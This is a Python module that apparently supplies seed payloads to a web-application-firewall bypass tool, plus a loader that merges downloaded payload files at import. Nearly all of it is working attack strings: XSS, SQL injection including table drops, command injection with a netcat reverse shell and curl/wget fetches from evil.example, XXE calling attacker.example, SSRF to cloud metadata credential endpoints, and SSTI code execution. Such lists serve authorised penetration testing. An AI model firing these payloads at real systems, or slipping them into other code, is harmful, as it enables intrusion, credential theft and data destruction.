"""Built-in seed payloads per attack class.

These are canonical, well-known attack strings used to *start* a bypass search.
This is a minimal bootstrap set; the versioned, auto-updating knowledge base
(roadmap) will supersede and extend it.
"""
from __future__ import annotations

SEEDS: dict[str, list[str]] = {
    "XSS Injection": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "\"><svg/onload=alert(1)>",
        "javascript:alert(1)",
        # more canonical, class-correct XSS vectors (PayloadsAllTheThings-style):
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=\"javascript:alert(1)\">",
        "<a href=\"javascript:alert(document.cookie)\">x</a>",
        "<video><source onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<img src=1 onerror=alert(document.domain)>",
        "<svg><script>alert(1)</script></svg>",
        "'><script>alert(String.fromCharCode(88,83,83))</script>",
        "<body background=\"javascript:alert(1)\">",
        "\"><img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        "<object data=\"javascript:alert(1)\">",
    ],
    "SQL Injection": [
        "' OR 1=1-- -",
        "1 UNION SELECT username,password FROM users",
        "' OR '1'='1",
        "admin'-- -",
        # auth-bypass, union, stacked, error- and time-based variants:
        "\" OR \"1\"=\"1",
        "' OR 1=1#",
        "') OR ('1'='1",
        "1' ORDER BY 1-- -",
        "' UNION SELECT NULL,NULL,NULL-- -",
        "' UNION SELECT @@version-- -",
        "' UNION SELECT table_name,NULL FROM information_schema.tables-- -",
        "1; DROP TABLE users-- -",
        "' OR SLEEP(5)-- -",
        "'; WAITFOR DELAY '0:0:5'-- -",
        "' AND 1=CONVERT(int,@@version)-- -",
        "' OR 'a'='a",
        "' AND SLEEP(5) AND '1'='1",
        "1' AND extractvalue(1,concat(0x7e,version()))-- -",
        "admin'/**/OR/**/1=1-- -",
        "' OR 1=1 LIMIT 1-- -",
    ],
    "Command Injection": [
        "; cat /etc/passwd",
        "| id",
        "$(whoami)",
        "`id`",
        # alternate separators and command-substitution forms:
        "& whoami",
        "&& cat /etc/passwd",
        "| cat /etc/passwd",
        "; id",
        "|| whoami",
        "$(cat /etc/passwd)",
        "`cat /etc/passwd`",
        "; ping -c 4 127.0.0.1",
        "; nc -e /bin/sh 10.0.0.1 4444",
        "; uname -a",
        "$(curl http://evil.example/shell.sh)",
        "; cat /etc/shadow",
        "; wget http://evil.example/x.sh",
        "| whoami",
    ],
    "Directory Traversal": [
        "../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "/var/www/../../etc/passwd",
        # percent-, double-percent-, overlong- and Windows-encoded variants:
        "..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc//passwd",
        "/..%2f..%2f..%2fetc/passwd",
        "../../../../../../etc/passwd%00",
        "/var/www/html/../../../../etc/passwd",
        "..//..//..//etc/passwd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "..\\..\\..\\..\\windows\\win.ini",
    ],
    "File Inclusion": [
        "php://filter/convert.base64-encode/resource=index.php",
        "/etc/passwd",
        "http://169.254.169.254/latest/meta-data/",
        # php:// wrapper chains, remote/RFI schemes and traversal-to-LFI:
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://filter/read=convert.base64-encode/resource=config.php",
        "php://input",
        "php://filter/convert.iconv.utf-8.utf-16le/resource=index.php",
        "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
        "php://filter/convert.base64-encode/resource=.htaccess",
        "file:///etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
        "expect://id",
    ],
    "SSTI": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        # per-engine expression + sandbox-escape probes:
        "{{7*'7'}}",
        "${{7*7}}",
        "{{config}}",
        "{{config.items()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "#{7*7}",
        "*{7*7}",
    ],
    "NoSQL Injection": [
        "' || '1'=='1",
        "{\"$gt\": \"\"}",
        # operator-injection and $where JS variants:
        "{\"$ne\": null}",
        "{\"$ne\": \"\"}",
        "{\"$regex\": \".*\"}",
        "{\"$where\": \"sleep(5000)\"}",
        "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
        "admin' || '1'=='1",
    ],
    # Use with Target(inject="upload", param=<multipart field name>) against a real
    # upload endpoint — these are filenames/extensions, not injection strings. Confirmed
    # live (2026-11) that an unfiltered endpoint accepts all of these identically to a
    # benign .pdf; see docs/VALIDATION.md.
    "Upload Insecure Files": [
        "phtml", "phar", "php", "php3", "php4", "php5", "php7", "pht", "phtm",
        "shtml", "asp", "aspx", "jsp", "jspx", "cgi", "exe", "svg", "html", "htaccess",
        "shell.php.jpg",       # double extension
        "shell.PhP",           # case variation
        "shell.php;.jpg",      # Apache multiviews / semicolon trick
        "shell.php%00.jpg",    # legacy null-byte trick
        "shell.pHtMl",
        # more executable/handler extensions and filename tricks:
        "php8", "asa", "asax", "ashx", "asmx", "cer", "war", "jspf",
        "shell.php.",          # trailing dot (Windows strips it)
        "shell.php::$DATA",    # NTFS alternate data stream
        "shell.php%20",        # trailing space
        "shell.aspx;.jpg",     # IIS semicolon trick
        "shell.phtml.png",     # double extension (phtml)
    ],
    "CRLF Injection": [
        "%0d%0aSet-Cookie: sessid=injected",
        "%0d%0aLocation: https://evil.example",
        "%0aSet-Cookie: admin=true",
        "%0d%0a%0d%0a<script>alert(1)</script>",     # header-split into body XSS
        "%E5%98%8D%E5%98%8ASet-Cookie: crlf=1",       # unicode CR/LF normalization trick
        "%0d%0aLocation: javascript:alert(1)",
        "%0d%0aRefresh: 0;url=javascript:alert(document.cookie)",
        "%250d%250aSet-Cookie: double=encoded",        # double URL-encoded CRLF
    ],
    "XXE Injection": [
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">]><foo>&xxe;</foo>",
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>",
        "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.example/evil.dtd\"> %xxe;]>",   # out-of-band
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
        "<!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol9 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">]><lolz>&lol9;</lolz>",  # billion laughs
    ],
    "SSRF": [
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",   # AWS IMDS
        "http://169.254.169.254/latest/user-data",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",     # Azure IMDS
        "http://metadata.google.internal/computeMetadata/v1/instance/",        # GCP metadata
        "http://127.0.0.1:80/",
        "gopher://127.0.0.1:6379/_SET%20key%20value",                          # Redis via gopher
        "http://2130706433/",                                                  # decimal 127.0.0.1
    ],
    "Open Redirect": [
        "//evil.example",
        "https://evil.example",
        "/\\evil.example",
        "https:evil.example",
        "//trusted.example@evil.example",      # userinfo confusion
        "/%2f%2fevil.example",
        "javascript:alert(document.domain)",
    ],
    "LDAP Injection": [
        "*)(uid=*))(|(uid=*",
        "*)(|(password=*))",
        "*))%00",
        "admin)(&)",
        "*)(objectClass=*)",
        "*)(|(cn=*))",
        "*)(mail=*)",
    ],
    "SSI": [
        "<!--#exec cmd=\"id\"-->",
        "<!--#exec cmd=\"cat /etc/passwd\"-->",
        "<!--#include virtual=\"/etc/passwd\"-->",
        "<!--#include file=\"/etc/passwd\"-->",
        "<!--#exec cmd=\"whoami\"-->",
        "<!--#echo var=\"DATE_LOCAL\"-->",
        "<!--#printenv-->",
        "<esi:include src=\"http://attacker.example/\" />",   # ESI injection
    ],
}


def _load_kb_overlay() -> int:
    """Merge extra seeds from an on-disk KB directory into SEEDS — the consumer the
    auto-updating KB was missing. `kb-update` downloads a bundle of per-class seed
    files; this makes `seeds_for()` actually pick them up without a code change, so the
    built-in bootstrap set can be EXTENDED at runtime. Each `<dir>/<Attack Class>.txt`
    holds one payload per line (`#` comments and blanks ignored). The directory is
    `$WAFFEN_KB_DIR`, else `./waffen_kb/seeds` if it exists. Returns payloads added.
    Safe to call repeatedly (dedupes) and never raises."""
    import os
    from pathlib import Path
    base = os.environ.get("WAFFEN_KB_DIR") or "waffen_kb/seeds"
    d = Path(base)
    if not d.is_dir():
        return 0
    added = 0
    for f in sorted(d.glob("*.txt")):
        try:
            lines = f.read_text(errors="replace").splitlines()
        except OSError:
            continue
        payloads = [s.strip() for s in lines if s.strip() and not s.lstrip().startswith("#")]
        if not payloads:
            continue
        bucket = SEEDS.setdefault(f.stem, [])
        seen = set(bucket)
        for p in payloads:
            if p not in seen:
                bucket.append(p)
                seen.add(p)
                added += 1
    return added


def classes() -> list[str]:
    return list(SEEDS.keys())


def seeds_for(attack_class: str) -> list[str]:
    return SEEDS.get(attack_class, [])


# Fold in any downloaded/updated KB seeds at import time (no-op when none present).
_load_kb_overlay()
